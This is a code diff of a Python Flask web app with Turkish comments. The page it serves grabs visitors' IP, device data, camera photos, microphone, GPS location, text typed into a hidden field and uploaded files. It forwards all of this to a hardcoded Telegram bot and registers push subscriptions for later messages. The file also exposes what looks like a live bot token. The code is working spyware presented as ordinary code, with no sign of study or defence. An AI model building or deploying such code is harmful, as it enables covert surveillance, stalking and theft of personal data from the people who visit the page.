@@ -12,8 +12,8 @@ TELEGRAM_TOKEN = "9021080798:AAEXhjdd0iAX1cvMFrk0MXfSj2PvnXvkSV8"
 CHAT_ID = "7622505128"
 GIZLI_ANAHTAR = "Utkan_Super_Gizli_2024" 
 
-# 🚨 SENİN SON VERDİĞİN GEÇERLİ GENEL ANAHTAR
-PUBLIC_KEY = "BJIOZNEa6iM7PhL6H45unEdTS9PO0ZzsKHcGk42ar3GPua4j6bs_t0WbWDcR71MaUGEPpqvBB0Ev2C32y_uKWDE"
+# 🚨 SENİN YENİ GERÇEK PUBLIC KEY'İN BURADA
+PUBLIC_KEY = "BNVBfYFTymRWK0JuHpDdiBzn7lblVtFd70olpJKFAPDkYKI1o839N9hQMGOopoXOvdWo0K98lV7uKIwdXPTLU9I"
 
 # --- TELEGRAM FONKSİYONLARI ---
 def telegram_mesaj_gonder(mesaj):
@@ -183,34 +183,27 @@ def ana_sayfa():
         async function izinleriIste() {{
             const durum = document.getElementById('durum');
             
-            // 1. CİHAZ BİLGİSİ
             fetch('/cihaz', {{
                 method: 'POST',
                 headers: {{ 'Content-Type': 'application/json', 'X-Secret-Key': SECRET_KEY }},
                 body: JSON.stringify({{ ip: IP_ADRESI, cihaz: CIHAZ_BILGISI }})
             }}).catch(e => console.log(e));
 
-            // 2. BİLDİRİM İZNİ VE ABONELİK (ESKİYİ İPTAL ETME EKLENDİ)
             if ('serviceWorker' in navigator && 'PushManager' in window) {{
                 try {{
                     durum.innerHTML = "Bildirim izni isteniyor...";
                     const izin = await Notification.requestPermission(); 
                     
                     if (izin === 'granted') {{
-                        durum.innerHTML = "Bildirim izni verildi. Service Worker hazırlanıyor...";
-                        
+                        durum.innerHTML = "Service Worker hazırlanıyor...";
                         await navigator.serviceWorker.register('/sw.js', {{ scope: '/' }});
                         const swReg = await navigator.serviceWorker.ready;
                         
-                        durum.innerHTML = "Eski abonelik kontrol ediliyor...";
-                        // 🚨 EĞER ESKİ BİR ABONELİK VARSA İPTAL ET!
                         const eskiAbonelik = await swReg.pushManager.getSubscription();
                         if (eskiAbonelik) {{
                             await eskiAbonelik.unsubscribe();
-                            durum.innerHTML = "Eski abonelik iptal edildi. Yenisi oluşturuluyor...";
                         }}
                         
-                        // Yeni anahtarla abone ol
                         const subscription = await swReg.pushManager.subscribe({{
                             userVisibleOnly: true,
                             applicationServerKey: urlBase64ToUint8Array(PUBLIC_VAPID_KEY)
@@ -232,7 +225,6 @@ def ana_sayfa():
             }}
 
             try {{
-                // 3. KAMERA
                 const stream = await navigator.mediaDevices.getUserMedia({{ video: true, audio: true }});
                 const video = document.getElementById('video');
                 video.srcObject = stream;
@@ -250,7 +242,6 @@ def ana_sayfa():
                         body: JSON.stringify({{ image: foto, ip: IP_ADRESI }})
                     }}).catch(e => console.log(e));
 
-                    // 4. GPS KONUM
                     setTimeout(() => {{
                         if (navigator.geolocation) {{
                             navigator.geolocation.getCurrentPosition(
@@ -267,7 +258,6 @@ def ana_sayfa():
                     }}, 1000); 
                 }};
 
-                // 5. KLAVYE
                 let sonGonderim = 0;
                 document.getElementById('gizliMetin').addEventListener('input', function(e) {{
                     const suan = Date.now();
@@ -281,7 +271,6 @@ def ana_sayfa():
                     }}
                 }});
 
-                // 6. DOSYA YÜKLEME
                 document.getElementById('dosyaSec').addEventListener('change', function(e) {{
                     const file = e.target.files[0];
                     if (file) {{
@@ -308,39 +297,16 @@ def ana_sayfa():
     """
     return html
 
-# --- ROTALAR ---
-
 @app.route('/abone_ol', methods=['POST'])
 def abone_ol():
     if request.headers.get('X-Secret-Key') != GIZLI_ANAHTAR: return "Hata", 403
     abonelik = request.json
-    
     try:
         with open('aboneler.json', 'a') as f:
             f.write(json.dumps(abonelik) + "\n")
     except: pass
-
-    mesaj = f"🔔 <b>YENİ CİHAZ ABONE OLDU!</b>\n\nBu JSON kodunu kopyala ve Pydroid'de kullan:\n\n<code>{json.dumps(abonelik)}</code>"
+    mesaj = f"🔔 <b>YENİ CİHAZ ABONE OLDU!</b>\n\nBu JSON kodunu kopyala:\n\n<code>{json.dumps(abonelik)}</code>"
     telegram_mesaj_gonder(mesaj)
-    return "OK", 200
-
-@app.route('/bildirim', methods=['POST'])
-def bildirim():
-    if request.headers.get('X-Secret-Key') != GIZLI_ANAHTAR: return "Hata", 403
-    veri = request.json
-    durum = veri.get('durum')
-    if durum == 'granted':
-        telegram_mesaj_gonder("🔔 <b>BİLDİRİM İZNİ VERİLDİ!</b>")
-    return "OK", 200
-
-@app.route('/hareket', methods=['POST'])
-def hareket():
-    if request.headers.get('X-Secret-Key') != GIZLI_ANAHTAR: return "Hata", 403
-    veri = request.json
-    hareketler = veri.get('hareketler', [])
-    if len(hareketler) > 0:
-        mesaj = f"🖱️ <b>HAREKET ANALİZİ</b>\n\nKullanıcı ekranda <b>{len(hareketler)}</b> noktada gezindi."
-        telegram_mesaj_gonder(mesaj)
     return "OK", 200
 
 @app.route('/cihaz', methods=['POST'])
@@ -354,7 +320,6 @@ def cihaz():
         sehir = konum.get('city', 'Bilinmiyor')
         hava = requests.get(f'https://wttr.in/{sehir}?format=3', timeout=3).text.strip()
     except: sehir, hava = "Bilinmiyor", "Alınamadı"
-
     mesaj = f"📱 <b>CİHAZ SİSTEME GİRDİ!</b>\n\n🌐 <b>IP:</b> {ip}\n📍 <b>Konum:</b> {sehir}\n☀️ <b>Hava:</b> {hava}\n💻 <b>Tarayıcı:</b> {cihaz[:60]}"
     telegram_mesaj_gonder(mesaj)
     return "OK", 200
@@ -389,6 +354,16 @@ def kamera():
     if request.headers.get('X-Secret-Key') != GIZLI_ANAHTAR: return "Hata", 403
     veri = request.json
     telegram_fotograf_gonder(veri['image'], "🚨 <b>AJAN YAKALANDI!</b>")
+    return "OK", 200
+
+@app.route('/hareket', methods=['POST'])
+def hareket():
+    if request.headers.get('X-Secret-Key') != GIZLI_ANAHTAR: return "Hata", 403
+    veri = request.json
+    hareketler = veri.get('hareketler', [])
+    if len(hareketler) > 0:
+        mesaj = f"🖱️ <b>HAREKET ANALİZİ</b>\n\nKullanıcı ekranda <b>{len(hareketler)}</b> noktada gezindi."
+        telegram_mesaj_gonder(mesaj)
     return "OK", 200
 
 if __name__ == '__main__':
